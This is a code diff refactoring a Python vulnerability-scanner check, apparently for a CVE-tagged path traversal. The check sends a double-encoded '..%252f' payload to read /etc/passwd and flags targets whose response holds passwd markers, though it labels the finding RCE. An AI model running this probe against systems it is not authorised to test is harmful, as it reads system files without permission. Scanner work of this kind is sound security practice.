@@ -11,6 +11,7 @@ from urllib.parse import urljoin
 from utils.custom_headers import DEFAULT_HEADER, TIMEOUT
 from colorama import Fore
 from utils.logging_config import configure_logger
+
 logger = configure_logger(__name__)
 requests.packages.urllib3.disable_warnings()
 
@@ -28,29 +29,40 @@ def check(url, dns_domain, proxies=None):
     payload = "test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd"
     target_url = urljoin(url, payload)
     try:
-        res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=False, proxies=proxies)
-        logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})
-        vulnerable_signs = [
-            r"x:0:0:root:/root:",
-            r"/sbin/nologin",
-            r"daemon"
-        ]
-        if res.status_code == 200 and all(sign in res.text for sign in vulnerable_signs):
-            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
-            return True, {
-                "CVE_ID": CVE_ID,
-                "URL": target_url,
-                "Details": f"检测到{CVE_ID}的RCE漏洞",
-                "response": res.text[:200] + "...."
-            }
-        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
-        return False, {}
+        return _extracted_from_check_12(target_url, proxies, url)
     except requests.RequestException as e:
         logger.debug(f"[Request Error：{e}]", extra={"target": target_url})
         return False, {}
     except Exception as e:
         logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
         return False, {}
+
+
+# TODO Rename this here and in `check`
+def _extracted_from_check_12(target_url, proxies, url):
+    res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=False, proxies=proxies)
+    logger.debug(
+        f"{Fore.CYAN}[{res.status_code}]{Fore.BLUE}" + f"[{res.headers}]",
+        extra={"target": target_url},
+    )
+    vulnerable_signs = [
+        r"x:0:0:root:/root:",
+        r"/sbin/nologin",
+        r"daemon"
+    ]
+    if res.status_code == 200 and all(sign in res.text for sign in vulnerable_signs):
+        logger.info(
+            f"{Fore.RED}[{CVE_ID} vulnerability detected!]",
+            extra={"target": target_url},
+        )
+        return True, {
+            "CVE_ID": CVE_ID,
+            "URL": target_url,
+            "Details": f"检测到{CVE_ID}的RCE漏洞",
+            "response": f"{res.text[:200]}....",
+        }
+    logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
+    return False, {}
 
 
 if __name__ == '__main__':
